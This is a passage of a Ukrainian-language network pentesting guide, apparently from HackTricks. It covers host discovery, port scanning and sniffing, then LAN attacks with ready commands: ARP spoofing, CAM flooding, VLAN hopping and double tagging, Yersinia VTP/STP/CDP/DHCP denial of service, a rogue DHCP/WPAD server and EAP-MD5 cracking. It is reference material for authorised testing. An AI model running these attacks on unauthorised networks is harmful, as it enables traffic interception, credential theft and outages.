# Pentesting мережі

{{#include ../../banners/hacktricks-training.md}}



## Виявлення hosts ззовні

Це буде **короткий розділ** про те, як знайти **IPs responding** з **Internet**.\
У цій ситуації у вас є певний **scope of IPs** (можливо навіть кілька **ranges**) і вам потрібно просто знайти **which IPs are responding**.

### ICMP

Це **найпростіший** і **найшвидший** спосіб дізнатися, чи host доступний чи ні.\
Ви можете спробувати відправити кілька **ICMP** пакетів і **expect responses**. Найпростіше — просто відправити **echo request** і чекати на відповідь. Це можна зробити за допомогою простого `ping`or using `fping`for **ranges**.\
Також можна використовувати **nmap** для відправки інших типів ICMP пакетів (це допоможе обійти фільтри для common ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Дуже часто трапляється, що всі види ICMP-пакетів фільтруються. Тоді все, що ви можете зробити, щоб перевірити, чи хост відповідає — це **try to find open ports**. Кожен хост має **65535 ports**, тому, якщо у вас великий scope, ви **cannot** тестувати, чи відкритий **each port** кожного хоста — це займе надто багато часу.\
Тоді вам потрібен **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) і список **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Цей крок також можна виконати за допомогою `nmap`, але це повільніше, і `nmap` має проблеми з виявленням активних хостів.

### HTTP Port Discovery

Це просто виявлення TCP-портів, корисне, коли ви хочете **зосередитися на виявленні HTTP** **services**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Виявлення UDP-портів

Ви також можете перевірити, чи якийсь **UDP порт відкритий**, щоб вирішити, чи варто **приділити більше уваги** **хосту.** Оскільки UDP-сервіси зазвичай **не відповідають** **жодними даними** на звичайний порожній UDP-зондуючий пакет, важко сказати, чи порт фільтрується чи відкритий. Найпростіший спосіб вирішити це — надіслати пакет, пов'язаний зі службою, що працює; оскільки ви не знаєте, яка служба працює, слід спробувати найімовірніші варіанти на основі номера порту:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Рядок nmap, запропонований раніше, перевірить **top 1000 UDP ports** на кожному хості в межах **/24**, але навіть це займе **>20min**. Якщо потрібні **fastest results**, ви можете використати [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Це відправить ці **UDP probes** на їх **expected port** (для діапазону /24 це займе лише 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Тут ви знайдете корисний посібник щодо всіх відомих Wifi-атак на момент написання:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Виявлення хостів зсередини

Якщо ви всередині мережі, одне з перших завдань — **виявити інші хости**. Залежно від того, **скільки шуму** ви можете/хочете створити, можна виконати різні дії:

### Пасивно

Ви можете використовувати ці інструменти для пасивного виявлення хостів у підключеній мережі:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Активне

Зверніть увагу, що техніки, описані в [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) також можна **застосувати тут**.\
Але, оскільки ви знаходитеся в **тій самій мережі**, що й інші hosts, ви можете зробити **більше**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Активний ICMP

Зверніть увагу, що техніки, описані в _Виявлення хостів ззовні_ ([_**ICMP**_](#icmp)) також можна **застосувати тут**.\
Але, оскільки ви в **тій самій мережі** що й інші хости, ви можете робити **більше**:

- Якщо ви **ping** **subnet broadcast address**, ping має дійти до **кожного хоста** і вони можуть **відповісти** **вам**: `ping -b 10.10.5.255`
- Пінгуючи **network broadcast address**, ви навіть можете знайти хости в **інших підмережах**: `ping -b 255.255.255.255`
- Використовуйте прапорці `-PE`, `-PP`, `-PM` у `nmap` для виявлення хостів, відправляючи відповідно **ICMPv4 echo**, **timestamp**, та **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan використовується для **увімкнення** комп'ютерів через **мережеве повідомлення**. The magic packet, який використовується для увімкнення комп'ютера, — це пакет, в якому задано **MAC Dst**, і який потім **повторюється 16 разів** всередині того самого пакету.\
Такі пакети зазвичай відправляються в **ethernet 0x0842** або в **UDP packet to port 9**.\
Якщо **no \[MAC]** не вказано, пакет відправляється на **broadcast ethernet** (і broadcast MAC буде тим, що повторюється).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Сканування хостів

Після того як ви виявили всі IP-адреси (зовнішні або внутрішні), які ви хочете ретельно просканувати, можна виконати різні дії.

### TCP

- **Open** port: _SYN --> SYN/ACK --> RST_
- **Closed** port: _SYN --> RST/ACK_
- **Filtered** port: _SYN --> \[NO RESPONSE]_
- **Filtered** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Існує 2 варіанти сканування UDP-порту:

- Надіслати **UDP packet** і перевірити наявність відповіді _**ICMP unreachable**_; якщо порт **закритий** (у багатьох випадках ICMP буде **фільтроване**, тож ви не отримаєте інформації про те, чи порт закритий чи відкритий).
- Відправити **formatted datagrams**, щоб викликати відповідь від **service** (наприклад, DNS, DHCP, TFTP та інші, як перераховано в _nmap-payloads_). Якщо ви отримали **відповідь**, то порт **відкритий**.

**Nmap** буде **поєднувати обидва** варіанти при використанні "-sV" (UDP scans дуже повільні), але зауважте, що UDP scans повільніші за TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** розроблено для використання поряд з **TCP (Transmission Control Protocol)** та **UDP (User Datagram Protocol)**. Головна мета — полегшити передачу телефонних даних через IP-мережі, відображаючи багато функцій надійності, що присутні в **Signaling System 7 (SS7)**. **SCTP** є основним компонентом сімейства протоколів **SIGTRAN**, яке має на меті передавати сигнали SS7 через IP-мережі.

Підтримка **SCTP** реалізована в різних операційних системах, таких як **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** та **VxWorks**, що свідчить про його широке визнання та корисність у сфері телекомунікацій та мереж.

Для SCTP nmap пропонує два різні scans: _-sY_ та _-sZ_.
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Додаткові опції nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Виявлення внутрішніх IP-адрес

**Неправильно налаштовані маршрутизатори, firewalls та мережеві пристрої** іноді відповідають на мережеві сканування, використовуючи **непублічні адреси джерела**. **tcpdump** можна використати для виявлення пакетів, отриманих із приватних адрес під час тестування. Зокрема, у Kali Linux пакети можна захопити на **eth2 interface**, який доступний з публічного Інтернету. Важливо зауважити, що якщо ваша конфігурація знаходиться за NAT або за Firewall, такі пакети, ймовірно, будуть відфільтровані.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

За допомогою Sniffing можна дізнатися деталі IP ranges, subnet sizes, MAC addresses і hostnames, переглядаючи захоплені frames і packets. Якщо мережа неправильно налаштована або switching fabric під навантаженням, attackers можуть захоплювати конфіденційні дані через passive network sniffing.

Якщо switched Ethernet network налаштовано правильно, ви бачитимете лише broadcast frames і матеріал, призначений для вашої MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Також можна захоплювати пакети з віддаленої машини через SSH-сесію, використовуючи Wireshark як GUI в реальному часі.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Очевидно.

### Capturing credentials

Ви можете використовувати інструменти, такі як [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), щоб витягти облікові дані з pcap або з живого інтерфейсу.

## LAN attacks

### ARP spoofing

ARP Spoofing полягає у відправленні gratuitous ARPResponses, щоб вказати, що IP машини має MAC нашого пристрою. Потім жертва змінить ARP table і щоразу звертатиметься до нашої машини, коли захоче зв'язатися з підробленим IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Переповніть switch’s CAM table, надсилаючи багато пакетів з різними source mac address. Коли CAM table заповнена, switch починає поводитися як hub (широкомовить увесь трафік).
```bash
macof -i <interface>
```
У сучасних комутаторах ця вразливість була виправлена.

### 802.1Q VLAN / DTP Атаки

#### Dynamic Trunking

Протокол **Dynamic Trunking Protocol (DTP)** реалізований як протокол канального рівня для автоматизації trunking, що дозволяє комутаторам автоматично обирати порти для режиму trunk (Trunk) або не-trunk режиму. Розгортання **DTP** часто розглядають як ознаку неоптимального дизайну мережі, що підкреслює важливість ручної конфігурації trunks лише там, де це необхідно, та належної документації.

За замовчуванням порти комутаторів налаштовані працювати в режимі Dynamic Auto, тобто вони готові ініціювати trunking за сигналом від сусіднього комутатора. Проблема безпеки виникає, коли pentester або атакуючий підключається до комутатора і відправляє DTP Desirable frame, примушуючи порт перейти в trunk mode. Це дозволяє атакуючому перерахувати VLANs шляхом аналізу STP frame і обійти VLAN segmentation шляхом створення віртуальних інтерфейсів.

Наявність DTP у багатьох комутаторах за замовчуванням може бути використана супротивником для імітації поведінки комутатора, отримуючи доступ до трафіку всіх VLANs. Скрипт [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) використовується для моніторингу інтерфейсу й показує, чи перебуває комутатор у режимі Default, Trunk, Dynamic, Auto або Access — останній є єдиною конфігурацією, що захищена від VLAN hopping attacks. Цей інструмент оцінює стан вразливості комутатора.

Якщо виявлено вразливість мережі, інструмент _**Yersinia**_ можна застосувати, щоб «enable trunking» через протокол DTP, що дозволяє спостерігати пакети з усіх VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Для перелічення VLANs також можна згенерувати DTP Desirable frame за допомогою скрипта [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py). Не переривайте скрипт ні в якому разі. Він інжектує DTP Desirable кожні три секунди. **Динамічно створені trunk channels на switch живуть лише п’ять хвилин. Після п’яти хвилин trunk відпадає.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Я хочу звернути увагу, що **Access/Desirable (0x03)** означає, що DTP frame має тип Desirable і наказує порту перейти в режим Trunk. А **802.1Q/802.1Q (0xa5** вказує тип інкапсуляції **802.1Q**.

Аналізуючи STP frames, **ми дізнаємося про наявність VLAN 30 та VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Атака конкретних VLAN

Після того, як ви дізналися VLAN IDs та IPs values, ви можете **configure a virtual interface to attack a specific VLAN**.\
Якщо DHCP недоступний, використайте _ifconfig_ для встановлення статичної статичної IP-адреси.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Обговорювана атака **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** інших VLANs **виконується автоматично** за допомогою інструмента: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Якщо нападник знає значення **MAC, IP and VLAN ID of the victim host**, він може спробувати **double tag a frame** з відповідним VLAN і VLAN жертви та відправити пакет. Оскільки **victim won't be able to connect back** з нападником, найкращим варіантом для нападника є спілкування через UDP з протоколами, які можуть виконувати корисні дії (наприклад, SNMP).

Іншим варіантом для нападника є запуск **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (ймовірно через інтернет). Потім нападник може sniff на другому хості, що йому належить, якщо той отримає пакети від жертви.

![](<../../images/image (190).png>)

Для виконання цієї атаки можна використовувати scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Латеральний обхід сегментації VLAN <a href="#d679" id="d679"></a>

Якщо у вас є **access to a switch that you are directly connected to**, ви маєте можливість **bypass VLAN segmentation** в межах мережі. Просто **switch the port to trunk mode** (otherwise known as trunk), створіть virtual interfaces з ID цільових VLAN і налаштуйте IP address. Ви можете спробувати отримати адресу динамічно (DHCP) або налаштувати її статично — залежить від випадку.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

У певних середовищах, наприклад у гостьових бездротових мережах, застосовуються налаштування port isolation (також відомі як private VLAN), щоб запобігти прямій взаємодії клієнтів, підключених до одного access point. Однак виявлено техніку, яка може обійти ці заходи ізоляції. Вона використовує відсутність або неправильну конфігурацію мережевих ACL, дозволяючи IP пакету бути маршрутизованим через router для досягнення іншого клієнта в тій же мережі.

Атака виконується шляхом створення **пакета, що несе IP address клієнта-цілі, але з MAC address маршрутизатора**. Це змушує router помилково переслати пакет до цільового клієнта. Цей підхід схожий на той, що використовується в Double Tagging Attacks, де можливість контролю хоста, доступного для жертви, застосовується для експлуатації вразливості.

**Ключові кроки атаки:**

1. **Створення пакета:** Спеціально сформований пакет містить IP address цільового клієнта, але з MAC address маршрутизатора.
2. **Експлуатація поведінки router:** Сформований пакет відправляється до router, який через конфігурацію перенаправляє пакет до цільового клієнта, тим самим обходячи ізоляцію, забезпечену private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) централізує управління VLAN. Він використовує revision numbers для підтримки цілісності VLAN database; будь-яка модифікація збільшує це число. Switches приймають конфігурації з вищими revision numbers, оновлюючи власні VLAN database.

#### VTP Domain Roles

- **VTP Server:** Керує VLAN — створює, видаляє, модифікує. Він розсилає VTP announcements членам домену.
- **VTP Client:** Отримує VTP announcements для синхронізації свого VLAN database. Ця роль обмежена і не дозволяє локально змінювати конфігурацію VLAN.
- **VTP Transparent:** Не бере участі в оновленнях VTP, але пересилає VTP announcements. Не піддається VTP атакам, зберігаючи постійний revision number рівний нулю.

#### VTP Advertisement Types

- **Summary Advertisement:** Broadcasted by the VTP server every 300 seconds, carrying essential domain information.
- **Subset Advertisement:** Sent following VLAN configuration changes.
- **Advertisement Request:** Issued by a VTP client to request a Summary Advertisement, typically in response to detecting a higher configuration revision number.

VTP vulnerabilities експлуатуються виключно через trunk ports, оскільки VTP announcements циркулюють лише через них. Після DTP attack сценарії можуть перейти до VTP. Інструменти на кшталт Yersinia можуть полегшити VTP атаки з метою очищення VLAN database, що фактично порушує роботу мережі.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
У графічному режимі Yersinia виберіть опцію deleting all VTP vlans, щоб очистити VLAN database.

### STP Атаки

**Якщо ви не можете захопити BPDU кадри на своїх інтерфейсах, малоймовірно, що вам вдасться здійснити STP-атаку.**

#### **STP BPDU DoS**

Надсилання великої кількості BPDUs TCP (Topology Change Notification) або Conf (BPDUs, які надсилаються при створенні топології) призводить до перевантаження комутаторів, і вони перестають коректно працювати.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Коли надсилається TCP, CAM table of the switches буде видалено через 15s. Якщо ви безперервно надсилатимете такі packets, CAM table буде перезапускатися постійно (або кожні 15segs), і коли він перезапускається, switch поводиться як hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Зловмисник імітує поведінку комутатора, щоб стати STP root мережі. Тоді через нього проходитиме більше даних. Це цікаво, коли ви підключені до двох різних комутаторів.\
Це робиться шляхом відправлення BPDUs CONF packets, які повідомляють, що значення **priority** менше за фактичний пріоритет поточного root-комутатора.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Якщо атакуючий підключений до двох комутаторів, він може стати коренем нового дерева, і весь трафік між цими комутаторами проходитиме через нього** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) є необхідним для зв'язку між пристроями CISCO, дозволяючи їм **взаємно ідентифікуватися та обмінюватися деталями конфігурації**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP налаштовано на трансляцію інформації через усі порти, що може створювати ризик безпеки. Атакувальник, підключившись до порту комутатора, може запустити мережеві сніфери, такі як **Wireshark**, **tcpdump**, або **Yersinia**. Це може розкрити конфіденційну інформацію про мережевий пристрій, включно з його моделлю та версією Cisco IOS, яка на ньому запущена. Потім атакувальник може націлитися на конкретні вразливості ідентифікованої версії Cisco IOS.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Більш агресивний підхід включає запуск Denial of Service (DoS) атаки шляхом перевантаження пам'яті комутатора, видаючи себе за легітимні пристрої CISCO. Нижче наведено послідовність команд для ініціації такої атаки за допомогою Yersinia, мережевого інструмента, призначеного для тестування:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Під час цієї атаки CPU комутатора та таблиця сусідів CDP зазнають значного навантаження, що призводить до того, що часто називають **“паралічем мережі”** через надмірне споживання ресурсів.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Атаки VoIP та інструмент VoIP Hopper

VoIP-телефони, що дедалі частіше інтегруються з IoT-пристроями, надають функції, як-от відчинення дверей або керування термостатами за допомогою спеціальних номерів телефонів. Однак така інтеграція може створювати ризики безпеки.

Інструмент [**voiphopper**](http://voiphopper.sourceforge.net) призначений імітувати VoIP-телефон у різних середовищах (Cisco, Avaya, Nortel, Alcatel-Lucent). Він визначає VLAN ID голосової мережі, використовуючи протоколи, такі як CDP, DHCP, LLDP-MED та 802.1Q ARP.

**VoIP Hopper** пропонує три режими для Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Аналізує мережеві пакети, щоб ідентифікувати VLAN ID.
2. **Spoof Mode** (`-c 1`): Генерує користувацькі пакети, що імітують пакети реального VoIP-пристрою.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Надсилає пакети, ідентичні пакетам конкретної моделі Cisco IP-телефону.

Переважним режимом для швидкості є третій. Він вимагає вказати:

- мережевий інтерфейс атакуючого (`-i` параметр).
- назву VoIP-пристрою, що імітується (`-E` параметр), у форматі найменування Cisco (наприклад, SEP, за яким слідує MAC-адреса).

У корпоративних налаштуваннях, щоб імітувати наявний VoIP-пристрій, можна:

- перевірити етикетку з MAC-адресою на телефоні.
- перейти в налаштування дисплея телефону, щоб побачити інформацію про модель.
- підключити VoIP-пристрій до ноутбука та спостерігати за CDP-запитами за допомогою Wireshark.

Приклад команди для запуску інструмента в третьому режимі:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP атаки

#### Енумерація
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Два типи DoS** можна виконати проти DHCP servers. Перший полягає в **simulate enough fake hosts to use all the possible IP addresses**.\
Ця атака працюватиме лише якщо ви можете бачити відповіді DHCP server і завершити протокол (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Наприклад, це **not possible in Wifi networks**.

Інший спосіб виконати DHCP DoS — надіслати **DHCP-RELEASE packet using as source code every possible IP**. Тоді server подумає, що всі завершили використання IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate servers try to reconnect, **ви зможете надати шкідливі значення, згадані в наступній атаці**.

#### Встановити шкідливі значення

A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. This is useful for network attacks, like capturing HTTP traffic and credentials, by redirecting traffic to a malicious server. However, setting a rogue gateway is less effective since it only allows capturing outbound traffic from the client, missing the responses from the real gateway. Instead, setting up a rogue DNS or WPAD server is recommended for a more effective attack.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

By correctly using these options, a rogue DHCP server can be established to intercept network traffic effectively.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Атаки**

Нижче наведені деякі тактики атак, які можна застосувати проти реалізацій 802.1X:

- Активне brute-force-підбирання пароля через EAP
- Атака на RADIUS сервер з некоректним EAP-контентом _\*\*_(exploits)
- Перехоплення EAP-повідомлень та офлайнове зламування паролів (EAP-MD5 і PEAP)
- Примусове використання EAP-MD5 для обходу перевірки TLS-сертифікатів
- Ін'єкція шкідливого мережевого трафіку після автентифікації з використанням hub або подібного

Якщо атакуючий знаходиться між жертвою та сервером автентифікації, він може спробувати при необхідності понизити протокол автентифікації до EAP-MD5 і перехопити спробу автентифікації. Потім він може виконати brute-force цього за допомогою:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) — це клас мережевих протоколів, призначених для **створення гарячої резервної системи маршрутизації**. За допомогою FHRP фізичні маршрутизатори можуть поєднуватися в один логічний пристрій, що підвищує відмовостійкість і допомагає розподіляти навантаження.

**Інженери Cisco Systems розробили два протоколи FHRP — GLBP і HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Існують три відомі версії Routing Information Protocol (RIP): RIP, RIPv2 та RIPng. RIP і RIPv2 відправляють дейтаграми до пірів через UDP на порт 520, тоді як RIPng транслює дейтаграми через IPv6-мультікаст на UDP порт 521. Підтримка MD5-аутентифікації була додана в RIPv2. Натомість RIPng не має вбудованої аутентифікації і покладається на опціональні заголовки IPsec AH та ESP в IPv6.

- **RIP and RIPv2:** Комунікація здійснюється через UDP дейтаграми на порті 520.
- **RIPng:** Використовує UDP порт 521 для трансляції дейтаграм через IPv6-мультікаст.

Зверніть увагу, що RIPv2 підтримує MD5-аутентифікацію, тоді як RIPng не має вбудованої аутентифікації і покладається на заголовки IPsec AH та ESP в IPv6.

### EIGRP Attacks

